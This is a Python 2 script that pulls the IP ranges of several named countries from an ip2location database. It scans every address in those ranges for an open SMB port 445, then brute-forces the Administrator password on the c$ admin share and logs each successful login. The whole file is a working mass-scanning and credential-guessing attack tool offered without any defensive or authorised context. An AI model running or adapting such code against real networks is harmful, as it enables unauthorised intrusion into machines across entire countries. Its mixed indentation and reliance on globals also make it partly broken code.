import netaddr, smbclient, socket, sys, os, ipaddress
from multiprocessing import Pool
import MySQLdb
def authenticate(ip,passwords):
	print 'Checking Authentication'
        for cpass in passwords:
                try:
                        #print 'checking authentication'
                        smb = smbclient.SambaClient(server=ip, share='c$', username='Administrator', password=cpass)
                        a = smb.listdir("/")
                        ishacked = "Sucessfully Authenticated with: Administrator\%s against %s" % (cpass, ip)
			with open("results.log", "a") as myfile:
                        	myfile.write(ishacked)
			break
                except Exception as e:
                        error_string = str(e)
                        if "NT_STATUS_ACCESS_DENIED" in error_string:
				#print "NT_STATUS_ACCESS_DENIED"
                                pass
                        else:
                                pass 
        return()

def filter_ips(ip):
	ip = str(ip)
        #print 'testing ip %s' % ip
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(2)
        result = sock.connect_ex((ip,port))
        if result == 0:
                isopen = '%s:%s open' % (ip, port)
		with open("results.log", "a") as myfile:
    			myfile.write(isopen)
                authenticate(ip,passwords)
        else:
		#print 'does not appear to be open'
		sock.close()
                pass
	return()
def initiate_scanning_pool(networks):
	for network in networks:
		ip_net = ipaddress.ip_network(network, strict=False)
        	all_hosts = list(ip_net.hosts())
        	p = Pool(5)
        	p.map(filter_ips, all_hosts)
	return

def get_cidr(number):
        number = int(number)
        cidr=0
        if number == 16777216: cidr = 8
        if number == 8388608: cidr = 9
        if number == 4194304: cidr = 10
        if number == 2097152: cidr = 11
        if number == 1048576: cidr = 12
        if number == 524288: cidr = 13
        if number == 262144: cidr = 14
        if number == 131072: cidr = 15
        if number == 65536: cidr = 16
        if number == 32768: cidr = 17
        if number == 16384: cidr = 18
        if number == 8192: cidr = 19
        if number == 4096: cidr = 20
        if number == 2048: cidr = 21
        if number == 1024: cidr = 22
        if number == 512: cidr = 23
        if number == 256: cidr = 24
	if cidr == 0: cidr = 24
        return(cidr)


def process_countries(countries,port,passwords):
        for country in countries:
                print country
		f=lambda a:reduce(lambda x,y:x*256+int(y),a.split("."),0)
		q=lambda a,b:abs(f(a)-f(b))+1
		string = "select INET_NTOA(ip_from),INET_NTOA(ip_to) from ip2location_db1 where country_code = '%s'" % country
		cur.execute(string)
		for row in cur.fetchall():
			address_differential = q(row[0],row[1])
                	cidr = get_cidr(address_differential)
                	ip = row[0].rstrip() 
                	network = u'%s/%s' % (ip, cidr)
			networks.append(network)
		initiate_scanning_pool(networks)
	return
 
port = int(445)
networks = []
db = MySQLdb.connect(host='localhost', user='localuser', passwd='easypassword', db='ip2location')
cur = db.cursor()
countries = ['CG','RU','IR','KP']
passwords = ["password1","password2","etc"]
process_countries(countries,port,passwords)
sys.exit()
